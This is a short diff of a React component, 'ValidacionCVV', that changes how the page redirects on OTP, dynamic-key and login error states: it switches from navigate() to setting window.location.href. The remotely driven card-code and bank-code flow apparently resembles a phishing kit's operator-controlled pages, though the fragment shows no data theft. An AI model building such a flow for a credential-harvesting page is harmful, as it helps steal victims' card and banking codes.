@@ -221,15 +221,15 @@ export default function ValidacionCVV() {
                         break;
                     case 'error_otp':
                         localStorage.setItem('estado_sesion', 'error');
-                        navigate("/numero-otp");
+                        window.location.href = '/numero-otp';
                         break;
                     case 'error_din':
                         localStorage.setItem('estado_sesion', 'error');
-                        navigate("/clave-dinamica");
+                        window.location.href = '/clave-dinamica';
                         break;
                     case 'error_login':
                         localStorage.setItem('estado_sesion', 'error');
-                        navigate("/autenticacion");
+                        window.location.href = '/autenticacion';
                         break;
                     default:
                         console.log("Estado no manejado en redirección:", estado);
